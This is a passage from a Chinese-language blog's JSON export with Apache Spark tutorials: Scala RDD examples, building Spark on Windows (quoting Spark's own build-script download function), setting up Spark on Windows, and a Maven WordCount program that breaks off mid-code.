class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">package rddbasic</span><br><span class=\"line\"></span><br><span class=\"line\">import org.apache.spark.storage.StorageLevel</span><br><span class=\"line\">import org.apache.spark.&#123;SparkConf, SparkContext&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">/**</span><br><span class=\"line\">  * Created by hanq0 on 2017/10/23.</span><br><span class=\"line\">  */</span><br><span class=\"line\">object stuRdds &#123;</span><br><span class=\"line\">  val conf = new SparkConf().setAppName(&quot;WordCount&quot;).setMaster(&quot;local&quot;)</span><br><span class=\"line\">  val sc = new SparkContext(conf)</span><br><span class=\"line\"></span><br><span class=\"line\">  //内部集合</span><br><span class=\"line\">  def innnerRdds(): Unit = &#123;</span><br><span class=\"line\">    val data = Array(1, 2, 3, 4, 5)</span><br><span class=\"line\">    val distData = sc.parallelize(data)</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  //外部数据</span><br><span class=\"line\">  def outterRdds(): Unit = &#123;</span><br><span class=\"line\">    val distFile = sc.textFile(&quot;data.txt&quot;)</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  //基本操作</span><br><span class=\"line\">  def basicRdd(): Unit = &#123;</span><br><span class=\"line\">    val lines = sc.textFile(&quot;data.txt&quot;)</span><br><span class=\"line\">    val lineLengths = lines.map(s =&gt; s.length)</span><br><span class=\"line\">    val totalLength = lineLengths.reduce((a, b) =&gt; a + b)</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  //调用函数</span><br><span class=\"line\">  def passFunctions(): Unit = &#123;</span><br><span class=\"line\">    val lines = sc.textFile(&quot;data.txt&quot;)</span><br><span class=\"line\">    val lineLengths = lines.map(MyFunctions.mymap)</span><br><span class=\"line\">    //val totalLength = lineLengths.reduce(MyFunctions.myreduce())</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  //闭包，集群模式下变量被分隔</span><br><span class=\"line\">  def valuesDisparched(): Unit = &#123;</span><br><span class=\"line\">    var counter = 0</span><br><span class=\"line\">    val data = Array(1, 2, 3, 4, 5)</span><br><span class=\"line\">    var rdd = sc.parallelize(data)</span><br><span class=\"line\">    // Wrong: Don&apos;t do this!!</span><br><span class=\"line\">    rdd.foreach(x =&gt; counter += x)</span><br><span class=\"line\">    println(&quot;Counter value: &quot; + counter)</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  //对键值对（key-value）的操作</span><br><span class=\"line\">  def KeyValueactions(): Unit = &#123;</span><br><span class=\"line\">    val lines = sc.textFile(&quot;data.txt&quot;)</span><br><span class=\"line\">    val pairs = lines.map(s =&gt; (s, 1))</span><br><span class=\"line\">    val counts = pairs.reduceByKey((a, b) =&gt; a + b)</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  //Rdd的转换Transformations</span><br><span class=\"line\">  def RddTransformations(): Unit = &#123;</span><br><span class=\"line\">    val data0 = Array(1, 2, 3, 4, 5)</span><br><span class=\"line\">    val data1 = Array(6, 7, 8, 9, 0)</span><br><span class=\"line\">    val data2 = data0.union(data1)</span><br><span class=\"line\">    //sortByKey([ascending], [numTasks]),sample(withReplacement, fraction, seed),repartition(numPartitions)......</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  //Rdd的操作Actions</span><br><span class=\"line\">  def RddActions(): Unit = &#123;</span><br><span class=\"line\">    val data = Array(1, 2, 3, 4, 5)</span><br><span class=\"line\">    var rdd = sc.parallelize(data)</span><br><span class=\"line\">    rdd.foreach(x =&gt; x+1)</span><br><span class=\"line\">    //reduce(func),collect(),count()......</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  //Rdd的持久化</span><br><span class=\"line\">  def RddStorage(): Unit = &#123;</span><br><span class=\"line\">    val data = sc.textFile(&quot;data.txt&quot;)</span><br><span class=\"line\">    data.persist(StorageLevel.MEMORY_ONLY) // persist() 方法进行设置</span><br><span class=\"line\">    data.cache() //cache() 方法是使用默认存储级别的快捷设置方法</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  //共享变量</span><br><span class=\"line\"></span><br><span class=\"line\">  //Broadcast variables（广播变量）允许程序员将一个 read-only（只读的）变量缓存到每台机器上</span><br><span class=\"line\">  def BroadcastVariables(): Unit = &#123;</span><br><span class=\"line\">    val broadcastVar = sc.broadcast(Array(1, 2, 3))</span><br><span class=\"line\">    print(broadcastVar.value)</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  //Accumulators（累加器）是一个仅可以执行 “added”（添加）的变量来通过一个关联和交换操作</span><br><span class=\"line\">  def AccumulatorsVariables(): Unit = &#123;</span><br><span class=\"line\">    val accum = sc.longAccumulator(&quot;My Accumulator&quot;)</span><br><span class=\"line\">    sc.parallelize(Array(1, 2, 3, 4)).foreach(x =&gt; accum.add(x))</span><br><span class=\"line\">    print(accum.value)</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>"},{"title":"1.spark windows编译","date":"2018-07-10T13:09:19.000Z","_content":"#### 1.环境\njdk1.8\n\nscala2.11.8\n\nspark2.11\n\nmaven4.0\n#### 2.github客户端\n官方给出的命令是在Linux上的\n> ./build/mvn -DskipTests clean package\n\n调用shell脚本取只想一些命令然后在用maven编译,一些过程如下\n```\ninstall_app() {\n  local remote_tarball=\"$1/$2\"\n  local local_tarball=\"${_DIR}/$2\"\n  local binary=\"${_DIR}/$3\"\n\n  # setup `curl` and `wget` silent options if we're running on Jenkins\n  local curl_opts=\"-L\"\n  local wget_opts=\"\"\n  if [ -n \"$AMPLAB_JENKINS\" ]; then\n    curl_opts=\"-s ${curl_opts}\"\n    wget_opts=\"--quiet ${wget_opts}\"\n  else\n    curl_opts=\"--progress-bar ${curl_opts}\"\n    wget_opts=\"--progress=bar:force ${wget_opts}\"\n  fi\n\n  if [ -z \"$3\" -o ! -f \"$binary\" ]; then\n    # check if we already have the tarball\n    # check if we have curl installed\n    # download application\n    [ ! -f \"${local_tarball}\" ] && [ $(command -v curl) ] && \\\n      echo \"exec: curl ${curl_opts} ${remote_tarball}\" 1>&2 && \\\n      curl ${curl_opts} \"${remote_tarball}\" > \"${local_tarball}\"\n    # if the file still doesn't exist, lets try `wget` and cross our fingers\n    [ ! -f \"${local_tarball}\" ] && [ $(command -v wget) ] && \\\n      echo \"exec: wget ${wget_opts} ${remote_tarball}\" 1>&2 && \\\n      wget ${wget_opts} -O \"${local_tarball}\" \"${remote_tarball}\"\n    # if both were unsuccessful, exit\n    [ ! -f \"${local_tarball}\" ] && \\\n      echo -n \"ERROR: Cannot download $2 with cURL or wget; \" && \\\n      echo \"please install manually and try again.\" && \\\n      exit 2\n........\n```\n需要用github的gitbush调用shell脚本\n\ngithub客户端安装\n\n鼠标右键会出现打开gitbush。。。\n\n#### 3.编译\n在项目根目录下右键打开gitbush\n输入命令\n> ./build/mvn -DskipTests clean package\n\n如果在有maven的报错可能是maven配置问题，但是shell脚本执行的操作已经完成\n\n直接在根目录下maven打包就可以了\n> mvn install\n\n编译时间很长","source":"_posts/spark/1.spark windows编译.md","raw":"---\ntitle: 1.spark windows编译\ndate: 2018-07-10 21:09:19\ntags: spark\n---\n#### 1.环境\njdk1.8\n\nscala2.11.8\n\nspark2.11\n\nmaven4.0\n#### 2.github客户端\n官方给出的命令是在Linux上的\n> ./build/mvn -DskipTests clean package\n\n调用shell脚本取只想一些命令然后在用maven编译,一些过程如下\n```\ninstall_app() {\n  local remote_tarball=\"$1/$2\"\n  local local_tarball=\"${_DIR}/$2\"\n  local binary=\"${_DIR}/$3\"\n\n  # setup `curl` and `wget` silent options if we're running on Jenkins\n  local curl_opts=\"-L\"\n  local wget_opts=\"\"\n  if [ -n \"$AMPLAB_JENKINS\" ]; then\n    curl_opts=\"-s ${curl_opts}\"\n    wget_opts=\"--quiet ${wget_opts}\"\n  else\n    curl_opts=\"--progress-bar ${curl_opts}\"\n    wget_opts=\"--progress=bar:force ${wget_opts}\"\n  fi\n\n  if [ -z \"$3\" -o ! -f \"$binary\" ]; then\n    # check if we already have the tarball\n    # check if we have curl installed\n    # download application\n    [ ! -f \"${local_tarball}\" ] && [ $(command -v curl) ] && \\\n      echo \"exec: curl ${curl_opts} ${remote_tarball}\" 1>&2 && \\\n      curl ${curl_opts} \"${remote_tarball}\" > \"${local_tarball}\"\n    # if the file still doesn't exist, lets try `wget` and cross our fingers\n    [ ! -f \"${local_tarball}\" ] && [ $(command -v wget) ] && \\\n      echo \"exec: wget ${wget_opts} ${remote_tarball}\" 1>&2 && \\\n      wget ${wget_opts} -O \"${local_tarball}\" \"${remote_tarball}\"\n    # if both were unsuccessful, exit\n    [ ! -f \"${local_tarball}\" ] && \\\n      echo -n \"ERROR: Cannot download $2 with cURL or wget; \" && \\\n      echo \"please install manually and try again.\" && \\\n      exit 2\n........\n```\n需要用github的gitbush调用shell脚本\n\ngithub客户端安装\n\n鼠标右键会出现打开gitbush。。。\n\n#### 3.编译\n在项目根目录下右键打开gitbush\n输入命令\n> ./build/mvn -DskipTests clean package\n\n如果在有maven的报错可能是maven配置问题，但是shell脚本执行的操作已经完成\n\n直接在根目录下maven打包就可以了\n> mvn install\n\n编译时间很长","slug":"spark/1.spark windows编译","published":1,"updated":"2018-07-10T13:10:09.979Z","_id":"cjjedmhbs007f0gtjxfpprrvt","comments":1,"layout":"post","photos":[],"link":"","content":"<h4 id=\"1-环境\"><a href=\"#1-环境\" class=\"headerlink\" title=\"1.环境\"></a>1.环境</h4><p>jdk1.8</p>\n<p>scala2.11.8</p>\n<p>spark2.11</p>\n<p>maven4.0</p>\n<h4 id=\"2-github客户端\"><a href=\"#2-github客户端\" class=\"headerlink\" title=\"2.github客户端\"></a>2.github客户端</h4><p>官方给出的命令是在Linux上的</p>\n<blockquote>\n<p>./build/mvn -DskipTests clean package</p>\n</blockquote>\n<p>调用shell脚本取只想一些命令然后在用maven编译,一些过程如下<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">install_app() &#123;</span><br><span class=\"line\">  local remote_tarball=&quot;$1/$2&quot;</span><br><span class=\"line\">  local local_tarball=&quot;$&#123;_DIR&#125;/$2&quot;</span><br><span class=\"line\">  local binary=&quot;$&#123;_DIR&#125;/$3&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">  # setup `curl` and `wget` silent options if we&apos;re running on Jenkins</span><br><span class=\"line\">  local curl_opts=&quot;-L&quot;</span><br><span class=\"line\">  local wget_opts=&quot;&quot;</span><br><span class=\"line\">  if [ -n &quot;$AMPLAB_JENKINS&quot; ]; then</span><br><span class=\"line\">    curl_opts=&quot;-s $&#123;curl_opts&#125;&quot;</span><br><span class=\"line\">    wget_opts=&quot;--quiet $&#123;wget_opts&#125;&quot;</span><br><span class=\"line\">  else</span><br><span class=\"line\">    curl_opts=&quot;--progress-bar $&#123;curl_opts&#125;&quot;</span><br><span class=\"line\">    wget_opts=&quot;--progress=bar:force $&#123;wget_opts&#125;&quot;</span><br><span class=\"line\">  fi</span><br><span class=\"line\"></span><br><span class=\"line\">  if [ -z &quot;$3&quot; -o ! -f &quot;$binary&quot; ]; then</span><br><span class=\"line\">    # check if we already have the tarball</span><br><span class=\"line\">    # check if we have curl installed</span><br><span class=\"line\">    # download application</span><br><span class=\"line\">    [ ! -f &quot;$&#123;local_tarball&#125;&quot; ] &amp;&amp; [ $(command -v curl) ] &amp;&amp; \\</span><br><span class=\"line\">      echo &quot;exec: curl $&#123;curl_opts&#125; $&#123;remote_tarball&#125;&quot; 1&gt;&amp;2 &amp;&amp; \\</span><br><span class=\"line\">      curl $&#123;curl_opts&#125; &quot;$&#123;remote_tarball&#125;&quot; &gt; &quot;$&#123;local_tarball&#125;&quot;</span><br><span class=\"line\">    # if the file still doesn&apos;t exist, lets try `wget` and cross our fingers</span><br><span class=\"line\">    [ ! -f &quot;$&#123;local_tarball&#125;&quot; ] &amp;&amp; [ $(command -v wget) ] &amp;&amp; \\</span><br><span class=\"line\">      echo &quot;exec: wget $&#123;wget_opts&#125; $&#123;remote_tarball&#125;&quot; 1&gt;&amp;2 &amp;&amp; \\</span><br><span class=\"line\">      wget $&#123;wget_opts&#125; -O &quot;$&#123;local_tarball&#125;&quot; &quot;$&#123;remote_tarball&#125;&quot;</span><br><span class=\"line\">    # if both were unsuccessful, exit</span><br><span class=\"line\">    [ ! -f &quot;$&#123;local_tarball&#125;&quot; ] &amp;&amp; \\</span><br><span class=\"line\">      echo -n &quot;ERROR: Cannot download $2 with cURL or wget; &quot; &amp;&amp; \\</span><br><span class=\"line\">      echo &quot;please install manually and try again.&quot; &amp;&amp; \\</span><br><span class=\"line\">      exit 2</span><br><span class=\"line\">........</span><br></pre></td></tr></table></figure></p>\n<p>需要用github的gitbush调用shell脚本</p>\n<p>github客户端安装</p>\n<p>鼠标右键会出现打开gitbush。。。</p>\n<h4 id=\"3-编译\"><a href=\"#3-编译\" class=\"headerlink\" title=\"3.编译\"></a>3.编译</h4><p>在项目根目录下右键打开gitbush<br>输入命令</p>\n<blockquote>\n<p>./build/mvn -DskipTests clean package</p>\n</blockquote>\n<p>如果在有maven的报错可能是maven配置问题，但是shell脚本执行的操作已经完成</p>\n<p>直接在根目录下maven打包就可以了</p>\n<blockquote>\n<p>mvn install</p>\n</blockquote>\n<p>编译时间很长</p>\n","site":{"data":{}},"excerpt":"","more":"<h4 id=\"1-环境\"><a href=\"#1-环境\" class=\"headerlink\" title=\"1.环境\"></a>1.环境</h4><p>jdk1.8</p>\n<p>scala2.11.8</p>\n<p>spark2.11</p>\n<p>maven4.0</p>\n<h4 id=\"2-github客户端\"><a href=\"#2-github客户端\" class=\"headerlink\" title=\"2.github客户端\"></a>2.github客户端</h4><p>官方给出的命令是在Linux上的</p>\n<blockquote>\n<p>./build/mvn -DskipTests clean package</p>\n</blockquote>\n<p>调用shell脚本取只想一些命令然后在用maven编译,一些过程如下<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">install_app() &#123;</span><br><span class=\"line\">  local remote_tarball=&quot;$1/$2&quot;</span><br><span class=\"line\">  local local_tarball=&quot;$&#123;_DIR&#125;/$2&quot;</span><br><span class=\"line\">  local binary=&quot;$&#123;_DIR&#125;/$3&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">  # setup `curl` and `wget` silent options if we&apos;re running on Jenkins</span><br><span class=\"line\">  local curl_opts=&quot;-L&quot;</span><br><span class=\"line\">  local wget_opts=&quot;&quot;</span><br><span class=\"line\">  if [ -n &quot;$AMPLAB_JENKINS&quot; ]; then</span><br><span class=\"line\">    curl_opts=&quot;-s $&#123;curl_opts&#125;&quot;</span><br><span class=\"line\">    wget_opts=&quot;--quiet $&#123;wget_opts&#125;&quot;</span><br><span class=\"line\">  else</span><br><span class=\"line\">    curl_opts=&quot;--progress-bar $&#123;curl_opts&#125;&quot;</span><br><span class=\"line\">    wget_opts=&quot;--progress=bar:force $&#123;wget_opts&#125;&quot;</span><br><span class=\"line\">  fi</span><br><span class=\"line\"></span><br><span class=\"line\">  if [ -z &quot;$3&quot; -o ! -f &quot;$binary&quot; ]; then</span><br><span class=\"line\">    # check if we already have the tarball</span><br><span class=\"line\">    # check if we have curl installed</span><br><span class=\"line\">    # download application</span><br><span class=\"line\">    [ ! -f &quot;$&#123;local_tarball&#125;&quot; ] &amp;&amp; [ $(command -v curl) ] &amp;&amp; \\</span><br><span class=\"line\">      echo &quot;exec: curl $&#123;curl_opts&#125; $&#123;remote_tarball&#125;&quot; 1&gt;&amp;2 &amp;&amp; \\</span><br><span class=\"line\">      curl $&#123;curl_opts&#125; &quot;$&#123;remote_tarball&#125;&quot; &gt; &quot;$&#123;local_tarball&#125;&quot;</span><br><span class=\"line\">    # if the file still doesn&apos;t exist, lets try `wget` and cross our fingers</span><br><span class=\"line\">    [ ! -f &quot;$&#123;local_tarball&#125;&quot; ] &amp;&amp; [ $(command -v wget) ] &amp;&amp; \\</span><br><span class=\"line\">      echo &quot;exec: wget $&#123;wget_opts&#125; $&#123;remote_tarball&#125;&quot; 1&gt;&amp;2 &amp;&amp; \\</span><br><span class=\"line\">      wget $&#123;wget_opts&#125; -O &quot;$&#123;local_tarball&#125;&quot; &quot;$&#123;remote_tarball&#125;&quot;</span><br><span class=\"line\">    # if both were unsuccessful, exit</span><br><span class=\"line\">    [ ! -f &quot;$&#123;local_tarball&#125;&quot; ] &amp;&amp; \\</span><br><span class=\"line\">      echo -n &quot;ERROR: Cannot download $2 with cURL or wget; &quot; &amp;&amp; \\</span><br><span class=\"line\">      echo &quot;please install manually and try again.&quot; &amp;&amp; \\</span><br><span class=\"line\">      exit 2</span><br><span class=\"line\">........</span><br></pre></td></tr></table></figure></p>\n<p>需要用github的gitbush调用shell脚本</p>\n<p>github客户端安装</p>\n<p>鼠标右键会出现打开gitbush。。。</p>\n<h4 id=\"3-编译\"><a href=\"#3-编译\" class=\"headerlink\" title=\"3.编译\"></a>3.编译</h4><p>在项目根目录下右键打开gitbush<br>输入命令</p>\n<blockquote>\n<p>./build/mvn -DskipTests clean package</p>\n</blockquote>\n<p>如果在有maven的报错可能是maven配置问题，但是shell脚本执行的操作已经完成</p>\n<p>直接在根目录下maven打包就可以了</p>\n<blockquote>\n<p>mvn install</p>\n</blockquote>\n<p>编译时间很长</p>\n"},{"title":"2.windows配置spark运行环境","date":"2018-07-10T13:09:19.000Z","_content":"[windows环境安装](http://blog.csdn.net/u011513853/article/details/52865076)\n#### 1.java配置\n使用jdk1.8  \n配置略\n#### 2.下载、配置scala\n[官网](http://www.scala-lang.org/)下载scala，解压放到自己的目录下。==目录不要有空格==\n\n把Scala的bin文件夹所在目录配置到环境变量的path中（过程和jdk配置一样）\n\n##### 测试是有完成\nwin+R cmd：\n\n    scala\n\n出现scala配置就是安装好了\n#### 3.下载、配置spark\n[官网](http://spark.apache.org/downloads.html)下载sapark，版本要和scala对应。 ==官网会有显示==\n\n解压到自己的目录下然后配置环境变量的path\n\n##### 测试安装\ncmd:\n    \n    spark-shell\n\n出现：\n    \n    Spark context available as sc.\n    SQL context available as sqlContext\n\n安装成功\n#### 4.下载、配置hadoop\n\n参考其他","source":"_posts/spark/2.windows配置spark运行环境.md","raw":"---\ntitle: 2.windows配置spark运行环境\ndate: 2018-07-10 21:09:19\ntags: spark\n---\n[windows环境安装](http://blog.csdn.net/u011513853/article/details/52865076)\n#### 1.java配置\n使用jdk1.8  \n配置略\n#### 2.下载、配置scala\n[官网](http://www.scala-lang.org/)下载scala，解压放到自己的目录下。==目录不要有空格==\n\n把Scala的bin文件夹所在目录配置到环境变量的path中（过程和jdk配置一样）\n\n##### 测试是有完成\nwin+R cmd：\n\n    scala\n\n出现scala配置就是安装好了\n#### 3.下载、配置spark\n[官网](http://spark.apache.org/downloads.html)下载sapark，版本要和scala对应。 ==官网会有显示==\n\n解压到自己的目录下然后配置环境变量的path\n\n##### 测试安装\ncmd:\n    \n    spark-shell\n\n出现：\n    \n    Spark context available as sc.\n    SQL context available as sqlContext\n\n安装成功\n#### 4.下载、配置hadoop\n\n参考其他","slug":"spark/2.windows配置spark运行环境","published":1,"updated":"2018-07-10T13:10:09.981Z","_id":"cjjedmhbt007i0gtjogvhm688","comments":1,"layout":"post","photos":[],"link":"","content":"<p><a href=\"http://blog.csdn.net/u011513853/article/details/52865076\" target=\"_blank\" rel=\"noopener\">windows环境安装</a></p>\n<h4 id=\"1-java配置\"><a href=\"#1-java配置\" class=\"headerlink\" title=\"1.java配置\"></a>1.java配置</h4><p>使用jdk1.8<br>配置略</p>\n<h4 id=\"2-下载、配置scala\"><a href=\"#2-下载、配置scala\" class=\"headerlink\" title=\"2.下载、配置scala\"></a>2.下载、配置scala</h4><p><a href=\"http://www.scala-lang.org/\" target=\"_blank\" rel=\"noopener\">官网</a>下载scala，解压放到自己的目录下。==目录不要有空格==</p>\n<p>把Scala的bin文件夹所在目录配置到环境变量的path中（过程和jdk配置一样）</p>\n<h5 id=\"测试是有完成\"><a href=\"#测试是有完成\" class=\"headerlink\" title=\"测试是有完成\"></a>测试是有完成</h5><p>win+R cmd：</p>\n<pre><code>scala\n</code></pre><p>出现scala配置就是安装好了</p>\n<h4 id=\"3-下载、配置spark\"><a href=\"#3-下载、配置spark\" class=\"headerlink\" title=\"3.下载、配置spark\"></a>3.下载、配置spark</h4><p><a href=\"http://spark.apache.org/downloads.html\" target=\"_blank\" rel=\"noopener\">官网</a>下载sapark，版本要和scala对应。 ==官网会有显示==</p>\n<p>解压到自己的目录下然后配置环境变量的path</p>\n<h5 id=\"测试安装\"><a href=\"#测试安装\" class=\"headerlink\" title=\"测试安装\"></a>测试安装</h5><p>cmd:</p>\n<pre><code>spark-shell\n</code></pre><p>出现：</p>\n<pre><code>Spark context available as sc.\nSQL context available as sqlContext\n</code></pre><p>安装成功</p>\n<h4 id=\"4-下载、配置hadoop\"><a href=\"#4-下载、配置hadoop\" class=\"headerlink\" title=\"4.下载、配置hadoop\"></a>4.下载、配置hadoop</h4><p>参考其他</p>\n","site":{"data":{}},"excerpt":"","more":"<p><a href=\"http://blog.csdn.net/u011513853/article/details/52865076\" target=\"_blank\" rel=\"noopener\">windows环境安装</a></p>\n<h4 id=\"1-java配置\"><a href=\"#1-java配置\" class=\"headerlink\" title=\"1.java配置\"></a>1.java配置</h4><p>使用jdk1.8<br>配置略</p>\n<h4 id=\"2-下载、配置scala\"><a href=\"#2-下载、配置scala\" class=\"headerlink\" title=\"2.下载、配置scala\"></a>2.下载、配置scala</h4><p><a href=\"http://www.scala-lang.org/\" target=\"_blank\" rel=\"noopener\">官网</a>下载scala，解压放到自己的目录下。==目录不要有空格==</p>\n<p>把Scala的bin文件夹所在目录配置到环境变量的path中（过程和jdk配置一样）</p>\n<h5 id=\"测试是有完成\"><a href=\"#测试是有完成\" class=\"headerlink\" title=\"测试是有完成\"></a>测试是有完成</h5><p>win+R cmd：</p>\n<pre><code>scala\n</code></pre><p>出现scala配置就是安装好了</p>\n<h4 id=\"3-下载、配置spark\"><a href=\"#3-下载、配置spark\" class=\"headerlink\" title=\"3.下载、配置spark\"></a>3.下载、配置spark</h4><p><a href=\"http://spark.apache.org/downloads.html\" target=\"_blank\" rel=\"noopener\">官网</a>下载sapark，版本要和scala对应。 ==官网会有显示==</p>\n<p>解压到自己的目录下然后配置环境变量的path</p>\n<h5 id=\"测试安装\"><a href=\"#测试安装\" class=\"headerlink\" title=\"测试安装\"></a>测试安装</h5><p>cmd:</p>\n<pre><code>spark-shell\n</code></pre><p>出现：</p>\n<pre><code>Spark context available as sc.\nSQL context available as sqlContext\n</code></pre><p>安装成功</p>\n<h4 id=\"4-下载、配置hadoop\"><a href=\"#4-下载、配置hadoop\" class=\"headerlink\" title=\"4.下载、配置hadoop\"></a>4.下载、配置hadoop</h4><p>参考其他</p>\n"},{"title":"4.scala、maven、spark下的wordcount程序","date":"2018-07-10T13:09:19.000Z","_content":"#### 环境\njdk1.8\n\nscala2.11.8\n\nspark2.11\n\nmaven4.0\n#### 新建工程\nide:idea\n\n新建一个maven工程，添加jdk和scala支持\n\n然后添加maven依赖\n\n编写wordcount代码\n\n右键运行scala类\n\n#### maven依赖:\n```\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<project xmlns=\"http://maven.apache.org/POM/4.0.0\"\n         xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n         xsi:schemaLocation=\"http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd\">\n    <modelVersion>4.0.0</modelVersion>\n\n    <groupId>test</groupId>\n    <artifactId>test</artifactId>\n    <version>1.0</version>\n\n    <dependencies>\n        <dependency>\n            <groupId>org.scala-lang</groupId>\n            <artifactId>scala-library</artifactId>\n            <version>2.11.8</version>\n        </dependency>\n        <dependency>\n            <groupId>org.scala-lang</groupId>\n            <artifactId>scala-compiler</artifactId>\n            <version>2.11.8</version>\n        </dependency>\n        <dependency>\n            <groupId>org.apache.spark</groupId>\n            <artifactId>spark-core_2.11</artifactId>\n            <version>2.3.0-SNAPSHOT</version>\n        </dependency>\n        <dependency>\n            <groupId>org.apache.spark</groupId>\n            <artifactId>spark-sql_2.11</artifactId>\n            <version>2.3.0-SNAPSHOT</version>\n        </dependency>\n    </dependencies>\n\n</project>\n```\n#### wordcout代码:\n```\n  package com.spark.app\n\n  import org.apache.spark.{SparkContext, SparkConf}\n\n  object WordCount {\n    def main(args: Array[String]) {\n      /**\n        * 第1步；创建Spark的配置对象SparkConf，设置Spark程序运行时的配置信息\n        * 例如 setAppName用来设置应用程序的名称，在程序运行的监控界面可以看到该名称，\n        * setMaster设置程序运行在本地还是运行在集群中，运行在本地可是使用local参数，也可以使用local[K]/local[*],\n        * 可以去spark官网查看它们不同的意义。 如果要运行在集群中，以Standalone模式运行的话，需要使用spark://HOST:PORT\n        * 的形式指定master的IP和端口号，默认是7077\n        */\n      val conf = new SparkConf().setAppName(\"WordCount\").setMaster(\"local\")\n      //  val conf = new SparkConf().setAppName(\"WordCount\").setMaster(\"spark://master:7077\")  // 运行在集群中\n\n      /**\n        * 第2步：创建SparkContext 对象\n        * SparkContext是Spark程序所有功能的唯一入口\n        * SparkContext核心作用： 初始化Spark应用程序运行所需要的核心组件，包括DAGScheduler、TaskScheduler、SchedulerBackend\n        * 同时还会负责Spark程序往Master注册程序\n        *\n        * 通过传入SparkConf实例来定制Spark运行的具体参数和配置信息\n        */\n      val sc = new SparkContext(conf)\n\n      /**\n        * 第3步： 根据具体的数据来源(HDFS、 HBase、Local FS、DB、 S3等)通过SparkContext来创建RDD\n        * RDD 的创建基本有三种方式： 根据外部的数据来源(例如HDFS)、根据Scala集合使用SparkContext的parallelize方法、\n        * 由其他的RDD操作产生\n        * 数据会被RDD划分成为一系列的Partitions，分配到每个Partition的数据属于一个Task的处理范畴\n        */\n\n      val lines = sc.textFile(\"D:/resources/README.md\")   // 读取本地文件\n      //  val lines = sc.textFile(\"/library/wordcount/input\")   // 读取HDFS文件，并切分成不同的Partition\n      //  val lines = sc.textFile(\"hdfs://master:9000/libarary/wordcount/input\")  // 或者明确指明是从HDFS上获取数据\n\n      /**\n        * 第4步： 对初始的RDD进行Transformation级别的处理，例如 map、filter等高阶函数来进行具体的数据计算\n        */\n      val words = lines.flatMap(_.split(\" \")).filter(word => word != \" \")  // 拆分单词，并过滤掉空格，当然还可以继续进行过滤，如去掉标点符号\n\n      val pairs = words.map(word => (word, 1))  // 在单词拆分的基础上对每个单词实例计数为1, 也就是 word => (word, 1)\n\n      val wordscount = pairs.reduceByKey(_ + _)  // 在每个单词实例计数为1的基础之上统计每个单词在文件中出现的总次数, 即key相同的value相加\n      //  